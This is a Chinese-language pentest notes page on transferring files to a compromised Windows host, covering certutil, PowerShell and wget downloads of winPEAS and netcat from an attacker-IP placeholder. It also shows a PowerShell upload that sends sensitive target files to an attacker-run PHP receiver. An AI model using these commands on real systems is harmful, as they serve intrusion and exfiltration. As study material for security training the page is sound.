---
description: 在目标系统中已经成功建立立足点后，需要传输一些脚本到目标系统中，以实现后续的提权操作
---

# ✔️ Windows文件传输 - Windows File Transfer

## 常用工具

1. certutil.exe
2. FTP
3. Powershell

## 常规方法

### 利用certutil.exe传输

{% hint style="info" %}
首选，兼容老旧的Windows系统：Windows XP / Windows Server 2003 / Windows Vista / Windows Server 2008 / Windows 7 /...

因为老旧的Windows系统没有默认安装或者安装的不是完整版的Powershell，但是certutil.exe是所有Windows系统都有的程序。
{% endhint %}

```bash
// Attacker
python3 -m http.server 8888
```

```
// Target
certutil -urlcache -f http://攻方IP:8888/winPEAS.exe winpeas.exe
```

### 利用FTP传输







### 利用Powershell传输

#### 下载

```powershell
// Target
Invoke-WebRequest -URL http://<攻方IP>/nc.exe -OutFile nc.exe
```

```bash
// Target
wget http://攻方IP/nc.exe -o nc.exe
```

#### 上传

```powershell
// Target
powershell(New-ObjectSystem.Net.WebClient).UploadFile('http://<攻方IP>/uploadwindows.php','.\<目标上的敏感文件>')
```

在攻方主机/var/www/html目录下分别创建：/uploads目录和uploadwindows.php文件

```php
// uploadwindows.php
<?php
$uploaddir = '/var/www/html/uploads/';
$uploadfile = $uploaddir.$_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'],$uploadfile)
?>
```



